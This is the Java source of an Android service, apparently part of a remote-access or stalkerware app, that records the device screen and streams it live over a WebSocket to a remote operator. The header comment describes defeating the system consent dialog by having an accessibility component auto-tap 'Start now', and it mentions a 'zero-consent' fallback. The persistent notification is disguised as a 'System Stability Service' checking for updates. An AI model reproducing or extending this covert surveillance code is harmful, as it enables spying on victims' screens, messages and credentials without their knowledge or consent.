package com.labs.labrats;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Point;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Surface;
import android.view.WindowManager;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

/**
 * GHOST_VIDEO v3: hardware-encoded realtime screen uplink.
 *
 * MediaProjection -> VirtualDisplay -> MediaCodec (H.264 Baseline) ->
 * Fmp4Muxer -> GhostWsServer -> browser <video> (MSE). Sustains display-rate
 * capture (30/60 fps profiles) with sub-second glass lag at a fraction of
 * MJPEG bandwidth. The screenshot-polling path (GhostStreamer) stays as the
 * zero-consent fallback.
 *
 * The one-time system consent dialog is hands-free: GhostVideoPermissionActivity
 * raises it on operator command and the accessibility core taps "Start now"
 * while GhostVideoSession auto-accept is armed. The grant token is then reused
 * across quality switches and restarts without re-prompting.
 */
public class GhostVideoService extends Service {

    private static final String TAG = "GhostVideo";
    public static final String ACTION_START = "com.labs.labrats.ghostvideo.START";
    public static final String ACTION_STOP = "com.labs.labrats.ghostvideo.STOP";
    public static final String EXTRA_PROFILE = "profile";

    private static final String CHANNEL_ID = "StabilityChannel";
    private static final int NOTIF_ID = 41;

    private static volatile GhostVideoService instance;

    public static boolean isRunning() {
        return instance != null;
    }

    public static long getFrames() {
        GhostVideoService s = instance;
        return s != null ? s.frames : 0;
    }

    public static double getEncFps() {
        GhostVideoService s = instance;
        return s != null ? s.measuredFps : 0;
    }

    public static int getViewers() {
        GhostVideoService s = instance;
        return (s != null && s.ws != null) ? s.ws.viewerCount() : 0;
    }

    public static int getWidth() {
        GhostVideoService s = instance;
        return s != null ? s.vw : 0;
    }

    public static int getHeight() {
        GhostVideoService s = instance;
        return s != null ? s.vh : 0;
    }

    public static byte[] getInitSegment() {
        GhostVideoService s = instance;
        return s != null ? s.initSegment : null;
    }

    public static String getCodecString() {
        GhostVideoService s = instance;
        return (s != null && s.muxer != null) ? s.muxer.getCodecString() : "";
    }

    private MediaProjection projection;
    private VirtualDisplay virtualDisplay;
    private MediaCodec encoder;
    private Surface inputSurface;
    private GhostWsServer ws;
    private HandlerThread callbackThread;

    private volatile boolean running = false;
    private Thread drainThread;
    private Fmp4Muxer muxer;
    private volatile byte[] initSegment;
    private volatile long frames = 0;
    private volatile long bytesOut = 0;
    private volatile double measuredFps = 0;
    private volatile long lastFrameWallMs = 0;
    private int vw = 0;
    private int vh = 0;
    private GhostVideoSession.VideoProfile activeProfile;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        startForegroundInternal();
        ws = new GhostWsServer();
        ws.setInitProvider(new GhostWsServer.InitProvider() {
            @Override
            public byte[] getInit() {
                return initSegment;
            }
        });
        try {
            ws.start(GhostVideoSession.WS_PORT);
        } catch (Exception e) {
            GhostVideoSession.setError("ws-bind: " + e.getMessage());
            stopSelf();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;
        String action = intent.getAction();
        if (ACTION_STOP.equals(action)) {
            teardown();
            stopSelf();
            return START_NOT_STICKY;
        }
        if (ACTION_START.equals(action)) {
            String p = intent.getStringExtra(EXTRA_PROFILE);
            if (p != null) GhostVideoSession.setProfile(p);
            if (running) {
                restartEncoder();
            } else {
                boot();
            }
        }
        return START_NOT_STICKY;
    }

    private void boot() {
        if (!GhostVideoSession.hasToken()) {
            GhostVideoSession.setState("CONSENT");
            stopSelf();
            return;
        }
        GhostVideoSession.setState("STARTING");
        GhostVideoSession.setError("");
        try {
            MediaProjectionManager mpm =
                    (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            projection = mpm.getMediaProjection(
                    GhostVideoSession.getResultCode(), GhostVideoSession.getResultData());
            if (projection == null) throw new IllegalStateException("null projection");
            // Required before createVirtualDisplay when targeting SDK 34+.
            ensureCallbackThread();
            projection.registerCallback(new MediaProjection.Callback() {
                @Override
                public void onStop() {
                    Log.w(TAG, "projection stopped by system");
                    GhostVideoSession.setState("STOPPED");
                    teardown();
                    try {
                        stopSelf();
                    } catch (Exception ignored) {}
                }
            }, new Handler(callbackThread.getLooper()));
            startEncoder();
            running = true;
            GhostVideoSession.setState("LIVE");
        } catch (Exception e) {
            Log.e(TAG, "boot", e);
            GhostVideoSession.setError("start: " + e.getMessage());
            GhostVideoSession.clearToken();
            teardown();
            stopSelf();
        }
    }

    private void restartEncoder() {
        GhostVideoSession.VideoProfile want = GhostVideoSession.getProfile();
        if (want == activeProfile && running) return;
        Log.d(TAG, "quality switch -> " + want.name());
        stopEncoder();
        try {
            // Fresh init for reconnecting players.
            initSegment = null;
            muxer = null;
            startEncoder();
            GhostVideoSession.setState("LIVE");
        } catch (Exception e) {
            Log.e(TAG, "restart", e);
            GhostVideoSession.setError("quality: " + e.getMessage());
        }
    }

    private void startEncoder() throws Exception {
        activeProfile = GhostVideoSession.getProfile();
        Point real = realDisplaySize();
        double scale = Math.min(1.0, activeProfile.widthCap / (double) Math.max(1, real.x));
        vw = even((int) Math.round(real.x * scale));
        vh = even((int) Math.round(real.y * scale));
        if (vw < 320) vw = 320;
        if (vh < 320) vh = 320;

        MediaFormat fmt = MediaFormat.createVideoFormat(
                MediaFormat.MIMETYPE_VIDEO_AVC, vw, vh);
        fmt.setInteger(MediaFormat.KEY_COLOR_FORMAT,
                MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
        fmt.setInteger(MediaFormat.KEY_BIT_RATE, activeProfile.bitrate);
        fmt.setInteger(MediaFormat.KEY_FRAME_RATE, activeProfile.fps);
        fmt.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 1); // 1s GOP -> fresh MSE join cadence
        fmt.setInteger(MediaFormat.KEY_PROFILE,
                MediaCodecInfo.CodecProfileLevel.AVCProfileBaseline);
        try {
            fmt.setInteger(MediaFormat.KEY_BITRATE_MODE, MediaCodecInfo.EncoderCapabilities.BITRATE_MODE_CBR);
        } catch (Exception ignored) {}

        encoder = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC);
        encoder.configure(fmt, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
        inputSurface = encoder.createInputSurface();
        encoder.start();

        DisplayMetrics dm = getResources().getDisplayMetrics();
        virtualDisplay = projection.createVirtualDisplay(
                "GhostVideo", vw, vh, dm.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                inputSurface, null, null);

        drainThread = new Thread(this::drainLoop, "GhostVideoDrain");
        drainThread.setDaemon(true);
        drainThread.start();
        Log.d(TAG, "encoder live " + vw + "x" + vh + "@" + activeProfile.fps);
    }

    private void drainLoop() {
        MediaCodec.BufferInfo info = new MediaCodec.BufferInfo();
        long nominal90k = 90000L / Math.max(1, activeProfile.fps);
        byte[] storedSps = null;
        byte[] storedPps = null;
        try {
            while (running) {
                int idx;
                try {
                    idx = encoder.dequeueOutputBuffer(info, 10000);
                } catch (Exception e) {
                    break;
                }
                if (idx == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) {
                    try {
                        MediaFormat of = encoder.getOutputFormat();
                        ByteBuffer spsB = of.getByteBuffer("csd-0");
                        ByteBuffer ppsB = of.getByteBuffer("csd-1");
                        if (spsB != null && ppsB != null) {
                            storedSps = drain(spsB);
                            storedPps = drain(ppsB);
                            muxer = new Fmp4Muxer(storedSps, storedPps, vw, vh);
                            initSegment = muxer.buildInitSegment();
                            ws.broadcast(initSegment);
                            Log.d(TAG, "init ready " + muxer.getCodecString());
                        }
                    } catch (Exception e) {
                        Log.w(TAG, "csd: " + e.getMessage());
                    }
                    continue;
                }
                if (idx < 0) continue; // TRY_AGAIN_LATER / output buffers changed

                byte[] annexb = null;
                boolean key = (info.flags & MediaCodec.BUFFER_FLAG_KEY_FRAME) != 0;
                try {
                    ByteBuffer bb = encoder.getOutputBuffer(idx);
                    if (bb != null && (info.flags & MediaCodec.BUFFER_FLAG_CODEC_CONFIG) == 0 && info.size > 0) {
                        annexb = new byte[info.size];
                        bb.position(info.offset);
                        bb.get(annexb);
                    }
                } catch (Exception ignored) {
                } finally {
                    try {
                        encoder.releaseOutputBuffer(idx, false);
                    } catch (Exception ignored) {
                    }
                }
                if (annexb == null) continue;

                try {
                    List<byte[]> nalus = Fmp4Muxer.splitAnnexB(annexb, 0, annexb.length);
                    List<byte[]> slices = new ArrayList<>();
                    for (byte[] nalu : nalus) {
                        if (nalu.length == 0) continue;
                        int type = nalu[0] & 0x1F;
                        if (type == 9) continue; // AUD: no use in fMP4
                        if (type == 7 || type == 8) {
                            // Encoder-repeated parameter sets: refresh stored copies pre-init,
                            // otherwise strip (we prepend stored copies to every keyframe).
                            if (muxer == null) {
                                if (type == 7) storedSps = nalu;
                                else storedPps = nalu;
                                if (storedSps != null && storedPps != null) {
                                    muxer = new Fmp4Muxer(storedSps, storedPps, vw, vh);
                                    initSegment = muxer.buildInitSegment();
                                    ws.broadcast(initSegment);
                                }
                            }
                            continue;
                        }
                        slices.add(nalu);
                    }
                    if (muxer == null || slices.isEmpty()) continue;

                    // One fragment per frame: minimal glass lag, MSE-safe at any boundary.
                    java.io.ByteArrayOutputStream sb =
                            new java.io.ByteArrayOutputStream(32 * 1024);
                    java.io.DataOutputStream ds = new java.io.DataOutputStream(sb);
                    if (key && storedSps != null && storedPps != null) {
                        ds.writeInt(storedSps.length); ds.write(storedSps);
                        ds.writeInt(storedPps.length); ds.write(storedPps);
                    }
                    for (byte[] sl : slices) {
                        ds.writeInt(sl.length);
                        ds.write(sl);
                    }
                    ds.flush();
                    Fmp4Muxer.Sample sample =
                            new Fmp4Muxer.Sample(sb.toByteArray(), info.presentationTimeUs, key);
                    byte[] frag = muxer.buildFragment(
                            Collections.singletonList(sample), nominal90k);
                    ws.broadcast(frag);
                    frames++;
                    bytesOut += frag.length;
                    long now = android.os.SystemClock.uptimeMillis();
                    if (lastFrameWallMs != 0) {
                        double dt = Math.max(1, now - lastFrameWallMs) / 1000.0;
                        double inst = 1.0 / dt;
                        measuredFps = measuredFps == 0 ? inst : measuredFps * 0.85 + inst * 0.15;
                    }
                    lastFrameWallMs = now;
                } catch (Exception e) {
                    Log.w(TAG, "mux: " + e.getMessage());
                }
            }
        } finally {
            Log.d(TAG, "drain exit");
        }
    }

    private static byte[] drain(ByteBuffer b) {
        ByteBuffer d = b.duplicate();
        byte[] r = new byte[d.remaining()];
        d.get(r);
        return r;
    }

    private void stopEncoder() {
        running = false;
        Thread t = drainThread;
        drainThread = null;
        if (t != null) {
            try {
                t.join(1500);
            } catch (InterruptedException ignored) {
            }
        }
        try {
            if (encoder != null) {
                try {
                    encoder.stop();
                } catch (Exception ignored) {
                }
                encoder.release();
            }
        } catch (Exception ignored) {
        }
        encoder = null;
        try {
            if (inputSurface != null) inputSurface.release();
        } catch (Exception ignored) {
        }
        inputSurface = null;
        try {
            if (virtualDisplay != null) virtualDisplay.release();
        } catch (Exception ignored) {
        }
        virtualDisplay = null;
        muxer = null;
    }

    private void teardown() {
        running = false;
        stopEncoder();
        try {
            if (projection != null) projection.stop();
        } catch (Exception ignored) {
        }
        projection = null;
        try {
            if (ws != null) ws.stop();
        } catch (Exception ignored) {
        }
        ws = null;
        try {
            if (callbackThread != null) callbackThread.quitSafely();
        } catch (Exception ignored) {
        }
        callbackThread = null;
        instance = null;
        try {
            stopForeground(true);
        } catch (Exception ignored) {
        }
    }

    @Override
    public void onDestroy() {
        teardown();
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void ensureCallbackThread() {
        if (callbackThread == null) {
            callbackThread = new HandlerThread("GhostVideoCb");
            callbackThread.start();
        }
    }

    private Point realDisplaySize() {
        try {
            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            if (wm != null) {
                Point p = new Point();
                wm.getDefaultDisplay().getRealSize(p);
                if (p.x > 0 && p.y > 0) return p;
            }
        } catch (Exception ignored) {
        }
        DisplayMetrics dm = getResources().getDisplayMetrics();
        return new Point(dm.widthPixels, dm.heightPixels);
    }

    private static int even(int v) {
        return (v / 2) * 2;
    }

    private void startForegroundInternal() {
        try {
            NotificationManager nm =
                    (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel ch = nm.getNotificationChannel(CHANNEL_ID);
                if (ch == null) {
                    ch = new NotificationChannel(CHANNEL_ID, "System Stability",
                            NotificationManager.IMPORTANCE_MIN);
                    try {
                        nm.createNotificationChannel(ch);
                    } catch (Exception ignored) {
                    }
                }
            }
            Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("System Stability Service")
                    .setContentText("Checking for system updates...")
                    .setSmallIcon(android.R.drawable.stat_sys_download)
                    .setOngoing(true)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .build();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIF_ID, n,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
            } else {
                startForeground(NOTIF_ID, n);
            }
        } catch (Exception e) {
            Log.w(TAG, "fg: " + e.getMessage());
        }
    }
}
